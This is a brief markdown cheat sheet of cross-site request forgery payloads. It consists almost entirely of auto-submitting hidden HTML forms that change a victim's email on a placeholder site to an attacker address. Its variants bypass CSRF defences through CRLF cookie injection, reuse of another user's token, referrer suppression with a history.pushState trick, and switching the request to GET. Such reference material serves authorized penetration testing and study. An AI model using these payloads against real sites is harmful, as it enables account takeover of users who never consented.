---
title: CSRF Payloads
desc: Proof of Concepts for Cross Site Request Forgery.
tags: [CSRF, Web]
alts: []
website: 
render_with_liquid: false
---

## HTTP POST request

```html
<form method="POST" action="https://vulnerable.com/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

<br />

## HTTP POST request (Cookie injection)

```html
<form method="POST" action="https://vulnerable.com/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<img src="https://vulnerable.com/?search=attack%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();">
```

<br />

## HTTP POST request (use the other csrf token)

```html
<form method="POST" action="https://vulnerable.com/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
    <input type="hidden" name="csrf" value="PqORuKZMr9zIJxpZC2cA8BgHuQGVkW8h">
</form>
<script>
    document.forms[0].submit();
</script>
```

<br />

## HTTP POST request (Referrer validation)

```html
<meta name="referrer" content="no-referrer">

<form method="POST" action="https://vulnerable.com/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
    // For referrer validation....
    history.pushState("", "", "/?vulnerable.com");
    
    document.forms[0].submit();
</script>
```

<br />

## HTTP GET request (to bypass CSRF token)

```html
<!-- ex. https://attacker.com/exploit -->

<form method="GET" action="https://vulnerable.com/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
    document.forms[0].submit();
</script>
```
